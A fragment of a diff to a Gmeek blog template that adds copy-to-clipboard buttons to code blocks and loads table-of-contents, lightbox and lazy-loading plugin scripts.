3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
 var utterancesLoad=0;
 
 console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
@@ -1370,7 +1378,70 @@ function iFrameLoading(){
     }
 }
 
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
 
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
 
 </script>
 </script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
